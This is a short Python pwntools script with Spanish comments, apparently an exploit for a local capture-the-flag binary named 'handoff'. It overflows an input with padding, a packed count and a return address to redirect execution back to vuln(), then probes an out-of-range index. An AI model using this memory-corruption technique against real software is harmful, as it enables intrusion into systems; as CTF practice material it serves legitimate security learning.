#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Test local
p = process('./handoff')

log.info("Agregando 10 entradas...")
for i in range(10):
    p.sendlineafter(b'Exit the app\n', b'1')
    p.sendlineafter(b'name: \n', f'e{i}'.encode())

log.info("Manipulando total_entries...")
vuln_addr = 0x401229

payload = b'A' * 8 + p32(20) + b'B' * 8 + p64(vuln_addr)
p.sendlineafter(b'Exit the app\n', b'3')
p.sendlineafter(b'appreciate it: \n', payload)

log.info("Esperando vuelta a vuln...")
try:
    response = p.recvuntil(b'Exit the app\n', timeout=3)
    log.success(f"¡Regresamos a vuln()! Response: {response[:100]}")
    
    # Intentar usar índice 10
    p.sendline(b'2')
    response = p.recvuntil(b'message to?\n', timeout=2)
    log.info(f"Pregunta por índice: {response}")
    
    p.sendline(b'10')
    response = p.recv(timeout=2)
    log.info(f"Response a índice 10: {response}")
    
except EOFError:
    log.error("EOFError - programa crasheó")
except Exception as e:
    log.error(f"Error: {e}")

p.close()
